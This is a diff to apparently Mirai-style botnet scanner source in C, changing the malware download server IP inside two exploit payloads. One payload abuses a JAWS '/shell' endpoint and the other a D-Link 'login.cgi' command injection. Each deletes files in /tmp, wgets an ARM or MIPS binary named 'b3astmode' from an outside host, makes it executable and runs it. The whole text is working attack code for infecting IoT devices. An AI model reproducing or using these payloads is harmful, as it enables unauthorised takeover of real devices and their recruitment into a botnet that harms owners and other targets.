@@ -326,14 +326,14 @@ void repscanner_scanner_init(void)
 						}
 						if (choice == 1)
 						{
-							util_strcpy(conn->payload_buf, "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://104.36.19.100/beastmode/b3astmode.arm7;+chmod+777+b3astmode.arm7;+./b3astmode.arm7+rep.arm7 HTTP/1.0\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: tbox/2.0\r\n\r\n");
+							util_strcpy(conn->payload_buf, "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://162.213.38.71/beastmode/b3astmode.arm7;+chmod+777+b3astmode.arm7;+./b3astmode.arm7+rep.arm7 HTTP/1.0\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: tbox/2.0\r\n\r\n");
 #ifdef DEBUG
 							printf("[dbg / rep / payload] has chosen payload: jaws\n");
 #endif						
 						}
 						if (choice == 2)
 						{
-							util_strcpy(conn->payload_buf, "GET /login.cgi?cli=aa%20aa%27;wget%20http://104.36.19.100/beastmode/b3astmode.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: tbox/2.0\r\n\r\n");						
+							util_strcpy(conn->payload_buf, "GET /login.cgi?cli=aa%20aa%27;wget%20http://162.213.38.71/beastmode/b3astmode.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: tbox/2.0\r\n\r\n");						
 #ifdef DEBUG
 							printf("[dbg / rep / payload] has chosen payload: dlink\n");
 #endif			
